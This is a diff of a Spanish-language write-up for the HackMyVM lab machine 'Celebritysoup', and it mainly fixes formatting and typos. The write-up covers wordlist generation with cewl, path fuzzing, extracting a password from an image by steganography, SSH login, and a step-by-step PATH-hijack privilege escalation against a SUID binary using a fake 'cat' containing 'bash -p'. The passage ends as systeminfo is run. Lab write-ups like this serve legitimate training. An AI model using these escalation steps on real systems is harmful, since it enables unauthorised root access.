@@ -69,7 +69,7 @@ Parece que tenemos varios archivos con extensión html, asique los reviso uno a 
 
 En cada archivo tenemos este patrón que se repite en los demás.
 
-```secret
+```html
 <div secret1="pu"></div>
 <div secret2="pp"></div>
 <div secret3="et"></div>
@@ -87,7 +87,9 @@ Al ver que el archivo sector9.html es diferente a los más, pienso que dentro ha
 
 Asique voy a probar a crear un diccionario con el contenido de la página usando la herramienta cewl.
 
-> `cewl --with-numbers http://192.168.0.15/sector9.html > diccionario_web.txt`
+```bash
+cewl --with-numbers http://192.168.0.15/sector9.html > diccionario_web.txt
+```
 
 Una vez generado el diccionario voy a fuzzear en busca de rutas.
 
@@ -99,7 +101,9 @@ Tenemos la ruta project2501.html, asique vamos a ver que hay.
 
 Puede que la información este escondida dentro de la imágen, pero no me deja descargarla, asique buscando en el código fuente encuentro una fuga en el código web, modding.css
 
-`<link href="modding.css" rel="stylesheet">`
+```html
+<link href="modding.css" rel="stylesheet">
+```
 
 Y encontramos la ruta de la imágen, que ya la podremos descargar y analizarla.
 
@@ -113,13 +117,13 @@ Pero no hay nada oculto... Aunque estoy seguro que hay algo en la imágen, ya qu
 
 ![](/assets/images/HMV/Celebritysoup-HackMyVM/sector10.gif)
 
-A través de una herramienta de esteganografía online adjunto la imágen y me da una cadena encodeada en binario... podría ser un mensaje...
+A través de una herramienta de esteganografía online adjunto la imágen y me da una cadena ofuscada en binario... podría ser un mensaje...
 
 ```binary
 0110010001101001011001110110100101110100011000010110110000101101011000100111001001100001011010010110111000101101011010010111001100101101011101000111001001100001011011100111001101100011011001010110111001100100011010010110111001100111
 ```
 
-Lo desencripto:
+Lo desofusco:
 
 ![](/assets/images/HMV/Celebritysoup-HackMyVM/binary.webp)
 
@@ -127,7 +131,7 @@ Parece una contraseña, alomejor podemos conectarnos a través de ssh usando el 
 
 ![](/assets/images/HMV/Celebritysoup-HackMyVM/ssh.webp)
 
-Hemos tenido userte, las credenciales eran válidas.
+Hemos tenido suerte, las credenciales eran válidas.
 
 Ahora ya puedo leer la flag user.txt, por lo tanto ya pasamos a la parte de escalar privilegios.
 
@@ -139,38 +143,38 @@ Como de costumbre para escalar privilegios primero debemos enumerar para encontr
 
 Antes de nada tenemos en el directorio donde se aloja la flag user.txt un archivo llamado `systeminfo`.
 
-> `-rwsr-xr-x 1 root         root         16712 ene  6  2021 systeminfo`
+> -rwsr-xr-x 1 root         root         16712 ene  6  2021 systeminfo
 
 El archivo systeminfo tiene privilegios SUID, asique voy a ver que contiene este archivo en su interior.
 
 ![](/assets/images/HMV/Celebritysoup-HackMyVM/escalada1.webp)
 
-Si nos fijamos tenemos rutas absolutas, excepto en la línea `cat /etc/*release` donde el cat en vez de definirse como /usr/bin/cat se define como cat solamente.
+Si nos fijamos tenemos rutas absolutas, excepto en `cat /etc/*release` donde el cat en vez de definirse como /usr/bin/cat se define como cat solamente.
 
-Podríamos aprovecharnos del cat para escalar privilegios, creando un archivo llamado cat añadiéndole cierto contenido en su interior, después lo colocamos en la variable de entorno para que al ejecutar el systeminfo ejecute nuestro cat modificado, por lo tanto ejecute el contenido de su interior.
+Podríamos aprovecharnos del cat para escalar privilegios, creando un archivo llamado igual añadiéndole cierto contenido en su interior, después lo colocamos en la variable de entorno para que al ejecutar el systeminfo ejecute nuestro cat modificado, por lo tanto ejecute el contenido de su interior.
 
 Lo mostaré paso por paso y lo entenderéis mejor:
  
-> Creamos el archivo cat 
+1. Creamos el archivo cat 
 
 `puppetmaster@CelebritySoup:~$ touch cat`
 
-> Añadimos el contenido dentro del archivo
+2. Añadimos el contenido dentro del archivo
 
 ```bash
 puppetmaster@CelebritySoup:~$ echo "bash -p" > cat
 puppetmaster@CelebritySoup:~$ cat cat
 bash -p
 ```
-> Le asiganos permisos de ejecución
+3. Le asiganos permisos de ejecución
 
 `chmod +x cat`
 
-> Lo añadimos la ruta a la variable de entorno PATH
+4. Lo añadimos la ruta a la variable de entorno PATH
 
 `export PATH=/home/puppetmaster/:$PATH`
 
-> Ejecutamos el archivo systeminfo
+5. Ejecutamos el archivo systeminfo
 
 ```bash
 puppetmaster@CelebritySoup:~$ ./systeminfo 
